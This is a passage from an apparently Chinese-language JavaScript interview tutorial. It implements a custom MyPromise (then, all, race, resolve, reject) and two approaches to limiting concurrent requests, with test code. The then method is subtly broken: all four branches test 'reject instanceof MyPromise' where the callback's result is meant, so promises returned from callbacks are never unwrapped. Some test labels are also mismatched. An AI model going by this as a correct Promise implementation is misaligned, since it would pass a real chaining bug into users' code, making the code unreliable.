  function reject(reason) {
    if (self.status !== PENDDING) return;
    self.status = REJECTED;
    self.data = reason;
    setTimeout(() => {
      self.callbacks.forEach(callbacksObj => {
        callbacksObj.onRejected(reason);
      })
    })
  }
  executor(resolve, reject)
}

// MyPromise原型链上存在then方法
MyPromise.prototype.then = function (onResolved, onRejected) {
  const self = this;
  return new MyPromise((resolve, reject) => { // 每次都返回一个新的Promise对象
    // 首先判断当前状态
    if (self.status === FULFILLED) {
      /* 
          1、返回的Promise的结果是由onResolved/onrejected决定的
          2、返回的是Promise对象 (根据执结果决定Promise的返回结果)
          3、返回的不是Promise对象 (该值就是Promise的返回结果)
          4、抛出异常 异常的值为返回的结果
      */
      setTimeout(() => {
        try {
          const result = onResolved(self.data);
          if (reject instanceof MyPromise) {
            result.then(value => {
              resolve(value);
            }, reason => {
              reject(reason);
            })
          } else {
            resolve(result);
          }

        } catch (error) {
          reject(error);
        }
      });

    }
    if (self.status === REJECTED) {
      setTimeout(() => {
        try {
          const result = onRejected(self.data);
          if (reject instanceof MyPromise) {
            result.then(value => {
              resolve(value);
            }, reason => {
              reject(reason);
            })
          } else {
            resolve(result);
          }

        } catch (error) {
          reject(error);
        }
      });

    }
    if (self.status === PENDDING) {
      self.callbacks.push({
        onResolved() {
          try {
            const result = onResolved(self.data);
            if (reject instanceof MyPromise) {
              result.then(value => {
                resolve(value);
              }, reason => {
                reject(reason);
              })
            } else {
              resolve(result);
            }

          } catch (error) {
            reject(error);
          }
        },
        onRejected() {
          try {
            const result = onRejected(self.data);
            if (reject instanceof MyPromise) {
              result.then(value => {
                resolve(value);
              }, reason => {
                reject(reason);
              })
            } else {
              resolve(result);
            }

          } catch (error) {
            reject(error);
          }
        }
      })
    }
  })
}
````

#### Promise.all / Promise.race

````js
//MyPromise实例对象上存在all方法
MyPromise.all = function (promises) {
    let promisesCount = 0
    let values = new Array(promises.length);
    return new MyPromise((resolve, reject) => {
      promises.forEach((promise, index) => {
        MyPromise.resolve(promise).then(value => {
          promisesCount++;
          values[index] = value;
          if (promisesCount === promises.length) {
            resolve(values);
          }
        }, reason => {
          reject(reason);
        })
      })
    })
}

//MyPromise实例对象上存在race方法
  MyPromise.race = function (promises) {
    return new MyPromise((resolve, reject) => {
      promises.forEach(promise => {
        MyPromise.resolve(promise).then(value => {
          resolve(value);
        }, reason => {
          reject(reason)
        })
      })
    })
  }
````

####   Promise.resolve  / Promise.reject

````js

MyPromise.resolve = function (value) {
    if (value instanceof MyPromise) return value;
    // 返回一个resolved状态的Promise对象
    return new MyPromise(resolve => resolve(value))             
}

//MyPromise实例对象上存在reject方法
MyPromise.reject = function (reason) {
    return new MyPromise((resolve,reject) => reject(reason));  // 返回一个reject状态Promise对象
}
````

### 9 并发请求的限制

> 请实现如下函数，
>
> 可以批量请求数据，所有 URL 地址在`urls`参数中，同时可以通过`max`参数控制请求的并发度，
>
> 当所有请求执行结束后需要执行`callback`回调函数，请求函数用 fetch 即可(不做请求失败处理)。



#### 思路一

- 利用async + await 与 promise.all 来进行， 每次以max来进行请求

````js
// 根据max将一维数组切成二维数组
const group = (list = [], max = 0) => {
  if (!list.length) {
    return list
  }
  let results = []
  for (let i = 0, len = list.length; i < len; i += max) {
    results.push(list.slice(i, i + max))
  }
  return results
}

const requestHandler = async (
  groupedUrl = [],
  callback = () => { }
) => {
  if (!groupedUrl.length) {
    callback()
    return groupedUrl
  }
  const newGroupedUrl = groupedUrl.map(fn => fn())
  const resultsMapper = (results) => results.map(callback)
  const data = await Promise.allSettled(newGroupedUrl).then(resultsMapper)
  return data;
}

// 单纯的请求入口
const sendRequest = async (
  urls = [],
  max = 0,
  callback = () => { }
) => {
  if (!urls.length) {
    return urls
  }
  const groupedUrls = group(urls, max)
  const results = []
  console.log('start !')
  for (let groupedUrl of groupedUrls) {
    try {
      const result = await requestHandler(groupedUrl, callback)
      results.push(result)
      console.log('go')
    } catch { }
  }
  console.log('done !')
  return results
}

// 测试代码
const p1 = () => new Promise((resolve, reject) => setTimeout(reject, 1000, 'p1'))
const p2 = () => Promise.resolve(2)
const p3 = () => new Promise((resolve, reject) => setTimeout(resolve, 2000, 'p3'))
const p4 = () => Promise.resolve(4)
const p5 = () => new Promise((resolve, reject) => setTimeout(reject, 2000, 'p5'))
const p6 = () => Promise.resolve(6)
const p7 = () => new Promise((resolve, reject) => setTimeout(resolve, 1000, 'p7'))
const p8 = () => Promise.resolve(8)
const p9 = () => new Promise((resolve, reject) => setTimeout(reject, 1000, 'p9'))
const p10 = () => Promise.resolve(10)
const p11 = () => new Promise((resolve, reject) => setTimeout(resolve, 2000, 'p10'))
const p12 = () => Promise.resolve(12)
const p13 = () => new Promise((resolve, reject) => setTimeout(reject, 1000, 'p11'))
const p14 = () => Promise.resolve(14)

const ps = [p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13, p14]
sendRequest(ps, 3, ({ reason, value }) => {
  console.log(reason || value)
})

````

#### 思路二

```js
function requestData(promiseList = [], max = 1, callback) {
  let requestArr = [],
    i = 0;
  // 我们将请求的promise一项一项丢入到其中（递归实现），执行完毕就删除掉
  // requestArr到达上限那么我们等待请求执行，有空位在继续添加
  // 
  toFetch().then(() => Promise.all(requestArr)).then(() => {
    callback('进程结束！');
  })

  function toFetch() {
    // 递归结束
    if (i === promiseList.length) return Promise.resolve();
    let _item = promiseList[i++]();
    console.log('进程进行中');
    requestArr.push(_item);
    // 宏任务执行结束后, 微任务执行，删除对应的那个微任务
    _item.then(() => { 
      requestArr.splice(requestArr.indexOf(_item), 1)
     });
    let result = Promise.resolve();
    // 是否需要进行并发处理?
    if (requestArr.length === max) {
      result = Promise.race(requestArr);
    }
    // 若有空位继续， 若无空位等待 => then
    return result.then(() => toFetch());
  }

}



// 测试代码
const p1 = () => new Promise((resolve, reject) => setTimeout(resolve, 1000, 'p1'))
const p2 = () => new Promise((resolve, reject) => setTimeout(resolve, 1000, 'p2'))
const p3 = () => new Promise((resolve, reject) => setTimeout(resolve, 1000, 'p3'))
const p4 = () => new Promise((resolve, reject) => setTimeout(resolve, 1000, 'p4'))
const p5 = () => new Promise((resolve, reject) => setTimeout(resolve, 1000, 'p5'))
const p6 = () => new Promise((resolve, reject) => setTimeout(resolve, 1000, 'p6'))
const p7 = () => new Promise((resolve, reject) => setTimeout(resolve, 1000, 'p7'))

const ps = [p1, p2, p3, p4, p5, p6, p7]

requestData(ps, 4, (reason, value) => {
  console.log(reason || value)
})


```

